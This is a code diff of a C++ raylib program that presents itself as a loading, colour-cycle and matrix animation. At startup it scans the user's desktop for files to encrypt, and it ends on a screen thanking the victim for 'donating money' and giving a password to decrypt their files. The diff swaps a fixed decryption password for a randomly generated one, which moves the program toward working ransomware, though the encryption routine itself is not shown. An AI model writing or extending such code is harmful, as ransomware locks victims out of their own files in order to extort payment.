@@ -85,12 +85,12 @@ void InitMatrixDigits(int count) {
 int main() {
     InitWindow(screenWidth, screenHeight, "Unified Window: Loading -> Color Cycle -> Matrix");
     SetTargetFPS(60);
-    // CALLING THE FILE SCANNER FUNCTION IN THE BEGINNING OF THE CODE si that we have the pathways to traverse
+
+    // CALLING THE FILE SCANNER FUNCTION IN THE BEGINNING OF THE CODE SO THAT WE HAVE THE PATHWAYS TO FOLLOW ENCRYPTION OK
     FileScanner::scanDesktopAndSave( "Information.txt");
     
     while (!WindowShouldClose()) {
         BeginDrawing();
-
         switch (state) {
             case MAIN_MENU: ShowMainMenuWindow(); break;
             case CREATE_FILE: ShowCreateFileWindow(); break;
@@ -141,7 +141,7 @@ void ShowMainMenuWindow() {
 
     // Calculate height for the text section
     int totalHeight = fontSize * 3 + spacing * 2;
-    int startY = (screenHeight - totalHeight) / 2 + 30; // Adjusted for logo space
+    int startY = (screenHeight - totalHeight) / 2 + 30; // Adjusted for logo space [will see if i have time to add in logo using SVG]
 
     // Draw welcome text
     DrawText(line1, (screenWidth - MeasureText(line1, fontSize)) / 2, startY, fontSize, DARKGRAY);
@@ -777,7 +777,9 @@ void ThankYou() {
     const char* Line1 = "Thank you for your cooperation.";
     const char* Line2 = "And donating money to us jobless CS students.";
     const char* Line3 = "Here is your password to decrypt your file:";
-    const char* Line4 = "1A234";
+    GenerateRandomPassword();   // Creating Random Password for encryption
+    string Password = GetGeneratedPassword();
+    const char* Line4 = Password.c_str(); // Display the randomly generated password
 
     while (!done) {
         BeginDrawing();
